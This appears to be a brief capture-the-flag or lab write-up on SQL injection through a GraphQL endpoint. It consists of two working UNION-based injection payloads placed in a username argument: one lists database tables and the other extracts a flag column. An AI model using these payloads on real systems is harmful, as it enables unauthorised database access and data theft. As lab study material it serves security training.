# [Injection Attacks](Injection%20Attacks.md)
### Exploit the SQL injection vulnerability to exfiltrate data from the database. What is the flag you find?

```graphql
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}
```
![](Screenshot%202026-09-14%20at%2014.08.37.png)

```graphql
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(flag),4,5,6 FROM flag-- -") {
    username
  }
}
```
![](Screenshot%202026-09-14%20at%2014.15.57.png)
